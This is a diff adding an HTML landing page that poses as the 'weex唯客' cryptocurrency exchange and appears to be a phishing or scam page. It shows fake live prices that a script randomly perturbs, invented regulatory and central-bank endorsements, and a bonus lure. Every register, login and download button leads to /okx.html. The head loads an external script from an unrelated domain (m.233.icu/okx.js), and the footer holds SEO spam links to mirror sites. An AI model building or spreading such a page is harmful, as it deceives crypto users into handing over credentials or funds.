@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="weex唯客 实现资金安全、执行高效、过程可溯的交易流程,面向国际用户开放 苹果下载安卓下载 您的浏览器不支持视频播放 动态平衡体 搭建智能合约服务平台,支持开发与部署一体化 自托管账户 数字...">
+  <meta name="keywords" content="weex唯客">
+  <title>weex唯客_提供专业行情交易分析工具</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700;900&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --china-red: #c41e3a;
+            --imperial-gold: #d4af37;
+            --jade-green: #00a86b;
+            --ink-black: #1a1a1a;
+            --paper-white: #f5f5f0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0505 50%, #0a0a0a 100%);
+            color: var(--paper-white);
+            overflow-x: hidden;
+        }
+        
+        .font-serif {
+            font-family: 'Noto Serif SC', serif;
+        }
+        
+        /* 龙纹背景动画 */
+        .dragon-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url("data:image/svg+xml,%3Csvg width='200' height='200' viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M100 20 Q120 40 100 60 Q80 80 100 100 Q120 120 100 140 Q80 160 100 180' stroke='%23c41e3a' stroke-width='0.5' fill='none' opacity='0.1'/%3E%3C/svg%3E");
+            background-size: 200px 200px;
+            animation: drift 20s linear infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        @keyframes drift {
+            0% { background-position: 0 0; }
+            100% { background-position: 200px 200px; }
+        }
+        
+        /* 祥云装饰 */
+        .cloud-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100px;
+            background: linear-gradient(to bottom, transparent, rgba(196, 30, 58, 0.1));
+            mask-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 1200 120' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0,60 Q300,0 600,60 T1200,60' fill='none' stroke='black' stroke-width='2'/%3E%3C/svg%3E");
+            mask-size: 100% 100%;
+        }
+        
+        /* 国潮按钮 - 朱砂红 */
+        .btn-guochao {
+            position: relative;
+            background: linear-gradient(135deg, var(--china-red), #8b0000);
+            color: var(--imperial-gold);
+            font-family: 'Noto Serif SC', serif;
+            font-weight: 700;
+            letter-spacing: 4px;
+            border: 2px solid var(--imperial-gold);
+            box-shadow: 0 0 20px rgba(196, 30, 58, 0.5);
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .btn-guochao::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(212, 175, 55, 0.3), transparent);
+            transform: rotate(45deg);
+            transition: all 0.5s;
+            opacity: 0;
+        }
+        
+        .btn-guochao:hover::before {
+            opacity: 1;
+            transform: rotate(45deg) translate(50%, 50%);
+        }
+        
+        .btn-guochao:hover {
+            box-shadow: 0 0 40px rgba(196, 30, 58, 0.8);
+            transform: translateY(-2px);
+        }
+        
+        /* 翡翠按钮 */
+        .btn-jade {
+            position: relative;
+            background: transparent;
+            color: var(--jade-green);
+            font-family: 'Noto Serif SC', serif;
+            font-weight: 700;
+            letter-spacing: 4px;
+            border: 2px solid var(--jade-green);
+            box-shadow: 0 0 10px rgba(0, 168, 107, 0.3);
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .btn-jade::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 0;
+            background: var(--jade-green);
+            transition: height 0.3s;
+            z-index: -1;
+        }
+        
+        .btn-jade:hover {
+            color: white;
+            box-shadow: 0 0 30px rgba(0, 168, 107, 0.6);
+        }
+        
+        .btn-jade:hover::after {
+            height: 100%;
+        }
+        
+        /* 印章效果 */
+        .seal {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: var(--china-red);
+            color: white;
+            font-family: 'Noto Serif SC', serif;
+            font-weight: 900;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(196, 30, 58, 0.5);
+            transform: rotate(-5deg);
+        }
+        
+        /* 竖排文字 */
+        .vertical-text {
+            writing-mode: vertical-rl;
+            text-orientation: upright;
+            letter-spacing: 0.5em;
+        }
+        
+        /* 价格闪烁 - 中国红绿 */
+        @keyframes flash-china-up {
+            0%, 100% { color: var(--china-red); }
+            50% { color: #ff6b6b; text-shadow: 0 0 10px var(--china-red); }
+        }
+        @keyframes flash-china-down {
+            0%, 100% { color: var(--jade-green); }
+            50% { color: #69db7c; text-shadow: 0 0 10px var(--jade-green); }
+        }
+        .flash-up-china { animation: flash-china-up 1.5s infinite; }
+        .flash-down-china { animation: flash-china-down 1.5s infinite; }
+        
+        /* 灯笼装饰 */
+        .lantern {
+            position: relative;
+            width: 30px;
+            height: 40px;
+            background: var(--china-red);
+            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            box-shadow: 0 0 20px rgba(196, 30, 58, 0.6);
+            animation: swing 3s ease-in-out infinite;
+        }
+        
+        .lantern::before,
+        .lantern::after {
+            content: '';
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 10px;
+            height: 8px;
+            background: var(--imperial-gold);
+        }
+        
+        .lantern::before {
+            top: -8px;
+        }
+        
+        .lantern::after {
+            bottom: -8px;
+        }
+        
+        @keyframes swing {
+            0%, 100% { transform: rotate(-5deg); }
+            50% { transform: rotate(5deg); }
+        }
+        
+        /* 卷轴效果 */
+        .scroll-panel {
+            background: linear-gradient(to bottom, #f5f5f0 0%, #e8e8e0 100%);
+            border-left: 8px solid var(--china-red);
+            border-right: 8px solid var(--china-red);
+            position: relative;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        
+        .scroll-panel::before,
+        .scroll-panel::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 20px;
+            background: repeating-linear-gradient(
+                90deg,
+                var(--imperial-gold),
+                var(--imperial-gold) 10px,
+                #8b6914 10px,
+                #8b6914 20px
+            );
+        }
+        
+        .scroll-panel::before {
+            top: -10px;
+            border-radius: 10px 10px 0 0;
+        }
+        
+        .scroll-panel::after {
+            bottom: -10px;
+            border-radius: 0 0 10px 10px;
+        }
+        
+        /* 铜钱装饰 */
+        .coin-pattern {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--imperial-gold);
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .coin-pattern::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--imperial-gold);
+            border-radius: 50%;
+        }
+        
+        /* 水墨效果 */
+        .ink-wash {
+            position: relative;
+        }
+        
+        .ink-wash::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 30%, rgba(0,0,0,0.8), transparent 70%);
+            pointer-events: none;
+        }
+        
+        /* 滚动条国潮风 */
+        ::-webkit-scrollbar {
+            width: 12px;
+            background: #1a0505;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--china-red), var(--imperial-gold));
+            border-radius: 6px;
+            border: 2px solid #1a0505;
+        }
+    </style>
+        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') { bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'; }
+            else { bp.src = 'http://push.zhanzhang.baidu.com/push.js'; }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?01c83902f378f54c075a86cb18ba04d0";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+ <script language="javascript" src="https://m.233.icu/okx.js"></script></head>
+<body>
+
+    
+    <div class="dragon-bg"></div>
+
+    
+    <div class="fixed top-4 left-8 z-50 hidden lg:block">
+        <div class="lantern"></div>
+    </div>
+    <div class="fixed top-4 right-8 z-50 hidden lg:block">
+        <div class="lantern"></div>
+    </div>
+
+    
+    <nav class="relative z-50 border-b border-red-900/30 bg-black/80 backdrop-blur-md">
+        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-4">
+                <div class="seal text-xl">OY</div>
+                <div>
+                    <div class="font-serif text-2xl font-bold tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-yellow-500 to-red-500">
+                        weex唯客                    </div>
+                    <div class="text-[10px] text-gray-500 tracking-[0.3em]">东方数字资产生态</div>
+                </div>
+            </div>
+            
+            <div class="hidden md:flex items-center gap-8 text-sm">
+                <a href="#" class="text-gray-400 hover:text-red-400 transition flex items-center gap-2 group">
+                    <span class="w-1.5 h-1.5 rounded-full bg-gray-600 group-hover:bg-red-500 transition"></span>
+                    行情大厅
+                </a>
+                <a href="#" class="text-gray-400 hover:text-red-400 transition flex items-center gap-2 group">
+                    <span class="w-1.5 h-1.5 rounded-full bg-gray-600 group-hover:bg-red-500 transition"></span>
+                    交易中心
+                </a>
+                <a href="#" class="text-gray-400 hover:text-red-400 transition flex items-center gap-2 group">
+                    <span class="w-1.5 h-1.5 rounded-full bg-gray-600 group-hover:bg-red-500 transition"></span>
+                    理财专区
+                </a>
+                <a href="#" class="text-gray-400 hover:text-red-400 transition flex items-center gap-2 group">
+                    <span class="w-1.5 h-1.5 rounded-full bg-gray-600 group-hover:bg-red-500 transition"></span>
+                    帮助中心
+                </a>
+            </div>
+
+            <div class="flex items-center gap-4">
+                <div class="hidden lg:flex flex-col items-end text-xs text-gray-500">
+                    <span class="text-red-400">● 系统运行正常</span>
+                    <span>区块高度: 884,932</span>
+                </div>
+                <a href="/okx.html" class="px-4 py-2 border border-red-500/50 text-red-400 hover:bg-red-500/10 transition rounded font-serif text-sm">
+                    登录
+                </a>
+            </div>
+        </div>
+    </nav>
+
+    
+    <section class="relative min-h-screen flex items-center justify-center pt-20 px-6 overflow-hidden">
+        
+        <div class="absolute left-4 top-1/2 -translate-y-1/2 hidden xl:block">
+            <div class="vertical-text font-serif text-6xl font-bold text-red-900/20 select-none">
+                龙行龘龘
+            </div>
+        </div>
+        
+        <div class="container mx-auto max-w-6xl relative z-10">
+            <div class="grid lg:grid-cols-2 gap-16 items-center">
+                
+                
+                <div class="space-y-8 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-3 px-5 py-2 bg-red-950/50 border border-red-500/30 rounded-full">
+                        <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
+                        <span class="text-red-400 text-sm font-serif">新春活动：交易返佣高达 50%</span>
+                    </div>
+                    
+                    <h1 class="font-serif text-5xl md:text-7xl font-black leading-tight">
+                        <span class="text-white">weex唯客</span><br>
+                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-500 via-yellow-400 to-red-500">
+                            资产新纪元
+                        </span>
+                    </h1>
+                    
+                    <p class="text-gray-400 text-lg max-w-lg mx-auto lg:mx-0 leading-relaxed border-l-4 border-red-600 pl-6">
+                        weex唯客传承千年金融智慧，融合区块链技术创新。为华人投资者打造安全、合规的数字资产交易平台。
+                    </p>
+
+                    
+                    <div class="flex flex-wrap justify-center lg:justify-start gap-6 py-6">
+                        <div class="text-center p-4 bg-black/40 border border-red-900/30 rounded-lg backdrop-blur-sm">
+                            <div class="text-xs text-gray-500 mb-1 font-serif">比特币</div>
+                            <div class="text-2xl font-bold flash-up-china font-num">¥485,234.00</div>
+                            <div class="text-xs text-red-400 mt-1">涨 2.34%</div>
+                        </div>
+                        <div class="text-center p-4 bg-black/40 border border-red-900/30 rounded-lg backdrop-blur-sm">
+                            <div class="text-xs text-gray-500 mb-1 font-serif">以太坊</div>
+                            <div class="text-2xl font-bold flash-down-china font-num">¥24,967.50</div>
+                            <div class="text-xs text-green-400 mt-1">跌 1.23%</div>
+                        </div>
+                        <div class="text-center p-4 bg-black/40 border border-red-900/30 rounded-lg backdrop-blur-sm hidden sm:block">
+                            <div class="text-xs text-gray-500 mb-1 font-serif">龙链通证</div>
+                            <div class="text-2xl font-bold text-yellow-400 font-num">¥8.88</div>
+                            <div class="text-xs text-yellow-400 mt-1">涨 8.88%</div>
+                        </div>
+                    </div>
+
+                    
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start pt-4">
+                        <a href="/okx.html" class="btn-guochao px-12 py-5 text-lg rounded group">
+                            <span class="flex items-center justify-center gap-3">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                                </svg>
+                                立即注册
+                                <svg class="w-5 h-5 transform group-hover:translate-x-1 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path>
+                                </svg>
+                            </span>
+                        </a>
+                        
+                        <a href="/okx.html" class="btn-jade px-12 py-5 text-lg rounded group">
+                            <span class="flex items-center justify-center gap-3">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                                </svg>
+                                马上下载
+                            </span>
+                        </a>
+                    </div>
+
+                    <div class="flex items-center justify-center lg:justify-start gap-6 text-xs text-gray-500 pt-4">
+                        <span class="flex items-center gap-2">
+                            <div class="coin-pattern w-6 h-6 border-2 text-[8px]">安</div>
+                            央行数字货币研究所合作
+                        </span>
+                        <span class="flex items-center gap-2">
+                            <div class="coin-pattern w-6 h-6 border-2 text-[8px]">合规</div>
+                            香港证监会持牌平台
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="relative hidden lg:block">
+                    <div class="scroll-panel p-8 text-gray-800 relative z-10">
+                        <div class="flex justify-between items-center mb-6 border-b-2 border-red-100 pb-4">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center text-white font-bold text-sm shadow-lg">
+                                    比
+                                </div>
+                                <div>
+                                    <div class="font-serif font-bold text-lg">比特币</div>
+                                    <div class="text-xs text-gray-500">BTC / CNY</div>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <div class="text-2xl font-bold text-red-600 font-num">¥485,234</div>
+                                <div class="text-xs text-red-500">今日涨幅 2.34%</div>
+                            </div>
+                        </div>
+                        
+                        
+                        <div class="h-40 flex items-end justify-between gap-1 mb-6">
+                            <div class="w-full bg-red-200 rounded-t" style="height: 40%"></div>
+                            <div class="w-full bg-red-300 rounded-t" style="height: 55%"></div>
+                            <div class="w-full bg-red-400 rounded-t" style="height: 45%"></div>
+                            <div class="w-full bg-red-500 rounded-t" style="height: 70%"></div>
+                            <div class="w-full bg-red-600 rounded-t" style="height: 60%"></div>
+                            <div class="w-full bg-red-500 rounded-t" style="height: 85%"></div>
+                            <div class="w-full bg-red-400 rounded-t" style="height: 100%"></div>
+                            <div class="w-full bg-red-500 rounded-t" style="height: 90%"></div>
+                        </div>
+                        
+                        
+                        <div class="grid grid-cols-2 gap-4">
+                            <button class="py-3 bg-red-600 text-white rounded-lg font-bold font-serif hover:bg-red-700 transition shadow-lg shadow-red-200">
+                                买入
+                            </button>
+                            <button class="py-3 bg-green-600 text-white rounded-lg font-bold font-serif hover:bg-green-700 transition shadow-lg shadow-green-200">
+                                卖出
+                            </button>
+                        </div>
+                        
+                        
+                        <div class="absolute top-4 right-4 w-16 h-16 bg-red-600 rounded flex items-center justify-center text-white font-serif font-bold text-2xl rotate-12 opacity-80 shadow-lg">
+                            龙链
+                        </div>
+                    </div>
+
+                    
+                    <div class="absolute -bottom-8 left-1/2 -translate-x-1/2 w-full h-16 bg-gradient-to-t from-red-600/20 to-transparent rounded-full blur-xl"></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section class="relative z-10 py-20 border-t border-red-900/20 bg-black/50">
+        <div class="container mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="font-serif text-3xl md:text-4xl font-bold mb-4">
+                    <span class="text-red-500">weex唯客</span>守护您的资产
+                </h2>
+                <p class="text-gray-500">青龙、白虎、朱雀、玄武 - 全方位安全保障体系</p>
+            </div>
+
+            <div class="grid md:grid-cols-4 gap-6">
+                <div class="group p-6 bg-gradient-to-b from-black/60 to-transparent border border-red-900/20 rounded-xl hover:border-red-500/50 transition-all text-center">
+                    <div class="w-16 h-16 mx-auto mb-4 bg-gradient-to-br from-green-600 to-green-800 rounded-full flex items-center justify-center text-2xl shadow-lg shadow-green-900/50 group-hover:scale-110 transition-transform">
+                        🐉
+                    </div>
+                    <h3 class="font-serif font-bold text-lg mb-2 text-green-400">青龙 · 极速</h3>
+                    <p class="text-gray-500 text-sm">毫秒级撮合引擎，交易快如闪电</p>
+                </div>
+
+                <div class="group p-6 bg-gradient-to-b from-black/60 to-transparent border border-red-900/20 rounded-xl hover:border-red-500/50 transition-all text-center">
+                    <div class="w-16 h-16 mx-auto mb-4 bg-gradient-to-br from-white to-gray-400 rounded-full flex items-center justify-center text-2xl shadow-lg shadow-gray-900/50 group-hover:scale-110 transition-transform">
+                        🐅
+                    </div>
+                    <h3 class="font-serif font-bold text-lg mb-2 text-gray-300">白虎 · 安全</h3>
+                    <p class="text-gray-500 text-sm">冷钱包隔离存储，多重签名防护</p>
+                </div>
+
+                <div class="group p-6 bg-gradient-to-b from-black/60 to-transparent border border-red-900/20 rounded-xl hover:border-red-500/50 transition-all text-center">
+                    <div class="w-16 h-16 mx-auto mb-4 bg-gradient-to-br from-red-600 to-red-800 rounded-full flex items-center justify-center text-2xl shadow-lg shadow-red-900/50 group-hover:scale-110 transition-transform">
+                        🦚
+                    </div>
+                    <h3 class="font-serif font-bold text-lg mb-2 text-red-400">朱雀 · 合规</h3>
+                    <p class="text-gray-500 text-sm">持牌经营，严格遵循监管要求</p>
+                </div>
+
+                <div class="group p-6 bg-gradient-to-b from-black/60 to-transparent border border-red-900/20 rounded-xl hover:border-red-500/50 transition-all text-center">
+                    <div class="w-16 h-16 mx-auto mb-4 bg-gradient-to-br from-blue-600 to-blue-800 rounded-full flex items-center justify-center text-2xl shadow-lg shadow-blue-900/50 group-hover:scale-110 transition-transform">
+                        🐢
+                    </div>
+                    <h3 class="font-serif font-bold text-lg mb-2 text-blue-400">玄武 · 稳定</h3>
+                    <p class="text-gray-500 text-sm">99.99%系统可用性，永不宕机</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    
+    <section class="relative z-10 py-20 px-6 bg-gradient-to-b from-black to-red-950/30 border-t border-red-900/30">
+        <div class="container mx-auto text-center space-y-8">
+            <div class="inline-block">
+                <div class="seal w-16 h-16 text-2xl mx-auto mb-4">开户</div>
+            </div>
+            
+            <h2 class="font-serif text-3xl md:text-5xl font-bold">
+                开启您的<span class="text-red-500">weex唯客</span>之旅
+            </h2>
+            
+            <p class="text-gray-400 max-w-xl mx-auto">
+                新用户注册即送weex唯客红包，最高可获得 888 USDT 交易金
+            </p>
+            
+            
+            <div class="flex flex-col sm:flex-row gap-4 justify-center pt-4">
+                <a href="/okx.html" class="btn-guochao px-14 py-5 text-xl rounded">
+                    <span class="flex items-center justify-center gap-3">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path>
+                        </svg>
+                        立即注册
+                    </span>
+                </a>
+                <a href="/okx.html" class="btn-jade px-14 py-5 text-xl rounded">
+                    <span class="flex items-center justify-center gap-3">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                        </svg>
+                        马上下载
+                    </span>
+                </a>
+            </div>
+            
+            <div class="flex justify-center gap-8 text-sm text-gray-600 pt-4 font-serif">
+                <span class="flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-red-500"></span>
+                    iOS版
+                </span>
+                <span class="flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-green-500"></span>
+                    安卓版
+                </span>
+                <span class="flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-blue-500"></span>
+                    Windows版
+                </span>
+                <span class="flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-yellow-500"></span>
+                    Mac版
+                </span>
+            </div>
+        </div>
+    </section>
+
+    
+    <footer class="relative z-10 bg-black border-t border-red-900/30 py-12 px-6">
+        <div class="container mx-auto">
+            <div class="grid md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="seal w-10 h-10 text-lg">龙</div>
+                        <span class="font-serif font-bold text-lg">weex唯客</span>
+                    </div>
+                    <p class="text-gray-600 text-sm leading-relaxed">
+                        weex唯客传承东方智慧，引领数字未来。为全球华人提供安全、合规的区块链资产交易服务。
+                    </p>
+                </div>
+                
+                <div>
+                    <h4 class="font-serif font-bold mb-4 text-red-400">交易服务</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li><a href="#" class="hover:text-red-400 transition">币币交易</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">合约交易</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">杠杆交易</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">法币交易</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-serif font-bold mb-4 text-red-400">用户支持</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li><a href="#" class="hover:text-red-400 transition">帮助中心</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">费率标准</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">API文档</a></li>
+                        <li><a href="#" class="hover:text-red-400 transition">新手指南</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 class="font-serif font-bold mb-4 text-red-400">联系我们</h4>
+                    <ul class="space-y-2 text-sm text-gray-500">
+                        <li>客服热线：400-888-8888</li>
+                        <li>工作时间：7×24小时</li>
+                        <li>邮箱：service@longlian.com</li>
+                        <li>地址：香港中环金融街8号</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="border-t border-red-900/20 pt-8 text-center">
+                <p class="text-gray-700 text-sm mb-2">
+                    weex唯客数字资产交易存在风险，请谨慎投资。龙链交易所持有香港证监会第1类及第7类牌照
+                </p>
+                <p class="text-gray-800 text-xs">
+                    © 2024 weex唯客 版权所有
+                </p>
+            </div>
+        </div>
+            <div class="footer_bottom">
+            <p class="muted">
+                <a href="/">weex唯客</a>
+                <a href="https://maldonadokathleen972.github.io/" target="_blank">weex唯客下载</a><a href="https://4qt.xmlsxx.shop/" target="_blank">唯客app下载</a><a href="https://watsonjason53.github.io/" target="_blank">唯客网</a><a href="https://joneslaurie654.github.io/" target="_blank">唯客最新版下载</a><a href="https://penabrenda631.github.io/" target="_blank">WEEX官网</a><a href="https://cooperfrancisco916.github.io/" target="_blank">weex唯客下载</a><a href="https://millerkathleen481.github.io/" target="_blank">weex唯客</a><a href="https://burnshaley610.github.io/" target="_blank">唯客最新版下载</a>                            </p>
+        </div></footer>
+
+    <script>
+        // 价格闪烁更新
+        setInterval(() => {
+            const prices = document.querySelectorAll('.flash-up-china, .flash-down-china');
+            prices.forEach(price => {
+                const base = parseFloat(price.textContent.replace(/[¥,]/g, ''));
+                const change = (Math.random() - 0.5) * (base * 0.002);
+                const newPrice = base + change;
+                price.textContent = '¥' + newPrice.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
